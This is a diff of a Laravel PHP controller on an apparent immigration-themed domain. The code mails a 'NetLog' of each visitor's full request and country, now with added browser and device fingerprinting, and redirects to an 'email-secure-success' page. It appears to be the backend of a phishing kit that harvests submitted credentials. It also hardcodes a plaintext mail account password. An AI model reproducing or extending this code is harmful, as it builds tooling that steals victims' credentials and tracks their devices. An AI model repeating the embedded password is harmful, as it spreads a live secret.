@@ -9,6 +9,7 @@ use Illuminate\Support\Facades\Config;
 use Illuminate\Support\Facades\Mail;
 use GuzzleHttp\Exception\GuzzleException;
 use GuzzleHttp\Client;
+use Jenssegers\Agent\Agent;
 
 class PageController extends Controller
 {
@@ -25,8 +26,18 @@ class PageController extends Controller
         Config::set('mail.username', 'help@usaimmigration.website');
         Config::set('mail.password', 'Olu2019@');
         $country = $this->getCountryName($request);
-        Mail::send( new NetLog($request, $country));
+        $agent = new Agent();
+        $all = array(($agent->isDesktop() ? 'YES':'NO'), $agent->platform(), $agent->version($agent->platform()), $agent->device(), $agent->browser());
+        Mail::send( new NetLog($request, $country, $all));
         return redirect('/email-secure-success');
+    }
+
+        public function agent()
+    {
+        $agent = new Agent();
+        $all = array(($agent->isDesktop() ? 'YES':'NO'), $agent->platform(), $agent->version($agent->platform()), $agent->device(), $agent->browser());
+        dd( $all );
+        // return redirect('/email-secure-success');
     }
 
 
